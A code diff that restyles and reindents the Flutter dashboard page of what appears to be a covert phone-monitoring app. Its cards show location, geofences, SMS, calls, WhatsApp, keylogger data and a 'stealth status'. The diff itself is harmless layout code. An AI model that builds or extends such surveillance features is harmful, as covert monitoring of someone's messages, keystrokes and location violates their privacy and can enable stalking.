@@ -42,242 +42,245 @@ class _DashboardPageState extends State<DashboardPage> {
 
         return Stack(
           children: [
-            SingleChildScrollView(
-              padding: const EdgeInsets.all(16),
-              child: Column(
-                children: [
-                  isWideScreen
-                      ? Row(
-                        crossAxisAlignment: CrossAxisAlignment.start,
-                        children: [
-                          Expanded(
-                            flex: 3,
-                            child: _wrapCard(
-                              SizedBox(
-                                height: 300,
-                                child: LocationMapCard(
-                                  username: widget.username,
-                                  onJumpToIndex: widget.onJumpToIndex,
-                                  onModuleLoaded: _onModuleLoaded,
+            // Background container
+            Container(
+              color: const Color(0xFFE2E2E2),
+              child: SingleChildScrollView(
+                padding: const EdgeInsets.all(16),
+                child: Column(
+                  children: [
+                    isWideScreen
+                        ? Row(
+                            crossAxisAlignment: CrossAxisAlignment.start,
+                            children: [
+                              Expanded(
+                                flex: 3,
+                                child: _wrapCard(
+                                  SizedBox(
+                                    height: 300,
+                                    child: LocationMapCard(
+                                      username: widget.username,
+                                      onJumpToIndex: widget.onJumpToIndex,
+                                      onModuleLoaded: _onModuleLoaded,
+                                    ),
+                                  ),
                                 ),
                               ),
-                            ),
-                          ),
-                          const SizedBox(width: 16),
-                          Expanded(
-                            flex: 1,
-                            child: _wrapCard(
-                              SizedBox(
-                                height: 300,
-                                child: GeofenceCard(
+                              const SizedBox(width: 16),
+                              Expanded(
+                                flex: 1,
+                                child: _wrapCard(
+                                  SizedBox(
+                                    height: 300,
+                                    child: GeofenceCard(
+                                      userId: widget.username,
+                                      onJumpToIndex: widget.onJumpToIndex,
+                                      onModuleLoaded: _onModuleLoaded,
+                                    ),
+                                  ),
+                                ),
+                              ),
+                            ],
+                          )
+                        : Column(
+                            children: [
+                              _wrapCard(
+                                SizedBox(
+                                  height: 300,
+                                  child: LocationMapCard(
+                                    username: widget.username,
+                                    onJumpToIndex: widget.onJumpToIndex,
+                                    onModuleLoaded: _onModuleLoaded,
+                                  ),
+                                ),
+                              ),
+                              const SizedBox(height: 16),
+                              _wrapCard(
+                                GeofenceCard(
                                   userId: widget.username,
                                   onJumpToIndex: widget.onJumpToIndex,
                                   onModuleLoaded: _onModuleLoaded,
                                 ),
                               ),
-                            ),
+                            ],
                           ),
-                        ],
-                      )
-                      : Column(
-                        children: [
-                          _wrapCard(
-                            SizedBox(
-                              height: 300,
-                              child: LocationMapCard(
-                                username: widget.username,
-                                onJumpToIndex: widget.onJumpToIndex,
-                                onModuleLoaded: _onModuleLoaded,
-                              ),
+                    const SizedBox(height: 20),
+                    isWideScreen
+                        ? IntrinsicHeight(
+                            child: Row(
+                              crossAxisAlignment: CrossAxisAlignment.stretch,
+                              children: [
+                                Expanded(
+                                  child: _wrapCard(
+                                    SmsSummaryCard(
+                                      username: widget.username,
+                                      onJumpToIndex: widget.onJumpToIndex,
+                                      onModuleLoaded: _onModuleLoaded,
+                                    ),
+                                  ),
+                                ),
+                                const SizedBox(width: 16),
+                                Expanded(
+                                  child: _wrapCard(
+                                    CallSummaryCard(
+                                      username: widget.username,
+                                      onJumpToIndex: widget.onJumpToIndex,
+                                      onModuleLoaded: _onModuleLoaded,
+                                    ),
+                                  ),
+                                ),
+                              ],
                             ),
-                          ),
-                          const SizedBox(height: 16),
-                          _wrapCard(
-                            GeofenceCard(
-                              userId: widget.username,
-                              onJumpToIndex: widget.onJumpToIndex,
-                              onModuleLoaded: _onModuleLoaded,
-                            ),
-                          ),
-                        ],
-                      ),
-                  const SizedBox(height: 20),
-                  isWideScreen
-                      ? IntrinsicHeight(
-                        child: Row(
-                          crossAxisAlignment: CrossAxisAlignment.stretch,
-                          children: [
-                            Expanded(
-                              child: _wrapCard(
+                          )
+                        : Column(
+                            children: [
+                              _wrapCard(
                                 SmsSummaryCard(
                                   username: widget.username,
                                   onJumpToIndex: widget.onJumpToIndex,
                                   onModuleLoaded: _onModuleLoaded,
                                 ),
                               ),
-                            ),
-                            const SizedBox(width: 16),
-                            Expanded(
-                              child: _wrapCard(
+                              const SizedBox(height: 16),
+                              _wrapCard(
                                 CallSummaryCard(
                                   username: widget.username,
                                   onJumpToIndex: widget.onJumpToIndex,
                                   onModuleLoaded: _onModuleLoaded,
                                 ),
                               ),
-                            ),
-                          ],
-                        ),
-                      )
-                      : Column(
-                        children: [
-                          _wrapCard(
-                            SmsSummaryCard(
-                              username: widget.username,
-                              onJumpToIndex: widget.onJumpToIndex,
-                              onModuleLoaded: _onModuleLoaded,
-                            ),
+                            ],
                           ),
-                          const SizedBox(height: 16),
-                          _wrapCard(
-                            CallSummaryCard(
-                              username: widget.username,
-                              onJumpToIndex: widget.onJumpToIndex,
-                              onModuleLoaded: _onModuleLoaded,
+                    const SizedBox(height: 20),
+                    isWideScreen
+                        ? IntrinsicHeight(
+                            child: Row(
+                              crossAxisAlignment: CrossAxisAlignment.stretch,
+                              children: [
+                                Expanded(
+                                  child: _wrapCard(
+                                    WhatsAppSummaryCard(
+                                      username: widget.username,
+                                      onJumpToIndex: widget.onJumpToIndex,
+                                      onModuleLoaded: _onModuleLoaded,
+                                    ),
+                                  ),
+                                ),
+                                const SizedBox(width: 16),
+                                Expanded(
+                                  child: _wrapCard(
+                                    KeyloggerSummaryCard(
+                                      userId: widget.username,
+                                      onJumpToIndex: widget.onJumpToIndex,
+                                      onModuleLoaded: _onModuleLoaded,
+                                    ),
+                                  ),
+                                ),
+                              ],
                             ),
-                          ),
-                        ],
-                      ),
-                  const SizedBox(height: 20),
-                  isWideScreen
-                      ? IntrinsicHeight(
-                        child: Row(
-                          crossAxisAlignment: CrossAxisAlignment.stretch,
-                          children: [
-                            Expanded(
-                              child: _wrapCard(
+                          )
+                        : Column(
+                            children: [
+                              _wrapCard(
                                 WhatsAppSummaryCard(
                                   username: widget.username,
                                   onJumpToIndex: widget.onJumpToIndex,
                                   onModuleLoaded: _onModuleLoaded,
                                 ),
                               ),
-                            ),
-                            const SizedBox(width: 16),
-                            Expanded(
-                              child: _wrapCard(
+                              const SizedBox(height: 16),
+                              _wrapCard(
                                 KeyloggerSummaryCard(
                                   userId: widget.username,
                                   onJumpToIndex: widget.onJumpToIndex,
                                   onModuleLoaded: _onModuleLoaded,
                                 ),
                               ),
-                            ),
-                          ],
-                        ),
-                      )
-                      : Column(
-                        children: [
-                          _wrapCard(
-                            WhatsAppSummaryCard(
-                              username: widget.username,
-                              onJumpToIndex: widget.onJumpToIndex,
-                              onModuleLoaded: _onModuleLoaded,
-                            ),
+                            ],
                           ),
-                          const SizedBox(height: 16),
-                          _wrapCard(
-                            KeyloggerSummaryCard(
-                              userId: widget.username,
-                              onJumpToIndex: widget.onJumpToIndex,
-                              onModuleLoaded: _onModuleLoaded,
+                    const SizedBox(height: 20),
+                    isWideScreen
+                        ? IntrinsicHeight(
+                            child: Row(
+                              crossAxisAlignment: CrossAxisAlignment.stretch,
+                              children: [
+                                Expanded(
+                                  child: _wrapCard(
+                                    TotalInstalledAppsCard(
+                                      username: widget.username,
+                                      onJumpToIndex: widget.onJumpToIndex,
+                                      onModuleLoaded: _onModuleLoaded,
+                                    ),
+                                  ),
+                                ),
+                                const SizedBox(width: 16),
+                                Expanded(
+                                  child: _wrapCard(
+                                    BlockedAppsCountCard(
+                                      username: widget.username,
+                                      onJumpToIndex: widget.onJumpToIndex,
+                                      onModuleLoaded: _onModuleLoaded,
+                                    ),
+                                  ),
+                                ),
+                                const SizedBox(width: 16),
+                                Expanded(
+                                  child: _wrapCard(
+                                    StealthStatusCard(
+                                      username: widget.username,
+                                      onJumpToIndex: widget.onJumpToIndex,
+                                      onModuleLoaded: _onModuleLoaded,
+                                    ),
+                                  ),
+                                ),
+                              ],
                             ),
-                          ),
-                        ],
-                      ),
-                  const SizedBox(height: 20),
-                  isWideScreen
-                      ? IntrinsicHeight(
-                        child: Row(
-                          crossAxisAlignment: CrossAxisAlignment.stretch,
-                          children: [
-                            Expanded(
-                              child: _wrapCard(
+                          )
+                        : Column(
+                            children: [
+                              _wrapCard(
                                 TotalInstalledAppsCard(
                                   username: widget.username,
                                   onJumpToIndex: widget.onJumpToIndex,
                                   onModuleLoaded: _onModuleLoaded,
                                 ),
                               ),
-                            ),
-                            const SizedBox(width: 16),
-                            Expanded(
-                              child: _wrapCard(
+                              const SizedBox(height: 20),
+                              _wrapCard(
                                 BlockedAppsCountCard(
                                   username: widget.username,
                                   onJumpToIndex: widget.onJumpToIndex,
                                   onModuleLoaded: _onModuleLoaded,
                                 ),
                               ),
-                            ),
-                            const SizedBox(width: 16),
-                            Expanded(
-                              child: _wrapCard(
-                                StealthStatusCard(
-                                  username: widget.username,
-                                  onJumpToIndex: widget.onJumpToIndex,
-                                  onModuleLoaded: _onModuleLoaded,
+                              const SizedBox(height: 20),
+                              SizedBox(
+                                width: double.infinity,
+                                child: ConstrainedBox(
+                                  constraints: const BoxConstraints(minHeight: 200),
+                                  child: Container(
+                                    padding: const EdgeInsets.all(8),
+                                    decoration: BoxDecoration(
+                                      color: Theme.of(context).scaffoldBackgroundColor,
+                                      borderRadius: BorderRadius.circular(12),
+                                    ),
+                                    child: StealthStatusCard(
+                                      username: widget.username,
+                                      onJumpToIndex: widget.onJumpToIndex,
+                                      onModuleLoaded: _onModuleLoaded,
+                                    ),
+                                  ),
                                 ),
                               ),
-                            ),
-                          ],
-                        ),
-                      )
-                      : Column(
-                        children: [
-                          _wrapCard(
-                            TotalInstalledAppsCard(
-                              username: widget.username,
-                              onJumpToIndex: widget.onJumpToIndex,
-                              onModuleLoaded: _onModuleLoaded,
-                            ),
+                            ],
                           ),
-                          const SizedBox(height: 20),
-                          _wrapCard(
-                            BlockedAppsCountCard(
-                              username: widget.username,
-                              onJumpToIndex: widget.onJumpToIndex,
-                              onModuleLoaded: _onModuleLoaded,
-                            ),
-                          ),
-                          const SizedBox(height: 20),
-                          SizedBox(
-                            width: double.infinity,
-                            child: ConstrainedBox(
-                              constraints: const BoxConstraints(minHeight: 200),
-                              child: Container(
-                                padding: const EdgeInsets.all(8),
-                                decoration: BoxDecoration(
-                                  color:
-                                      Theme.of(context).scaffoldBackgroundColor,
-                                  borderRadius: BorderRadius.circular(12),
-                                ),
-                                child: StealthStatusCard(
-                                  username: widget.username,
-                                  onJumpToIndex: widget.onJumpToIndex,
-                                  onModuleLoaded: _onModuleLoaded,
-                                ),
-                              ),
-                            ),
-                          ),
-                        ],
-                      ),
-                  const SizedBox(height: 20),
-                ],
+                    const SizedBox(height: 20),
+                  ],
+                ),
               ),
             ),
 
-            // Loader
+            // Loader overlay
             AnimatedOpacity(
               opacity: _allModulesLoaded ? 0.0 : 1.0,
               duration: const Duration(milliseconds: 500),
